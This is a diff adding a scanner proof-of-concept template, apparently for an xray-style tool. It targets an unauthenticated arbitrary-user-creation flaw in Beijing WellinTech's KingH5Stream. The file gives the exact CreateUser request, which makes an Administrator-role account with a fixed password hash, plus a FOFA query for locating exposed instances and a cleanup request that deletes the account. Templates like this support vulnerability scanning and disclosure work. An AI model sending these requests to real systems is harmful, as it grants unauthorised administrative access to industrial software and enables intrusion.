@@ -1,0 +1,21 @@
+id: poc-yaml-kingh5stream-anyuser-create
+info:
+  name: 北京亚控科技KingH5Stream 任意用户创建漏洞
+  severity: medium
+  tags:
+  - 权限绕过
+  finger: kingh5stream
+  fofa: body="kingH5stream"
+variables:
+  t1: random_str(5)
+requests:
+- method: GET
+  path: /api/v1/CreateUser?user={{.t1}}&password=cc03e747a6afbbcbf8be7668acfebee5&roletoken=Administrator
+  expression: "status_code == 200 && \ncontains(body,\"\\\"bStatus\\\"\\x3a true\"\
+    ) &&\ncontains(body,\"\\\"strCode\\\"\\x3a \\\"CreateUser  successfully\\\"\"\
+    ) &&\ncontains(content_type,\"application/json\")\n"
+- method: GET
+  path: /api/v1/DeleteUser?user={{.t1}}&session=
+  expression: "status_code == 200 && \ncontains(body,\"DeleteUser  successfully\"\
+    ) &&\ncontains(content_type,\"application/json\")\n"
+transport: http
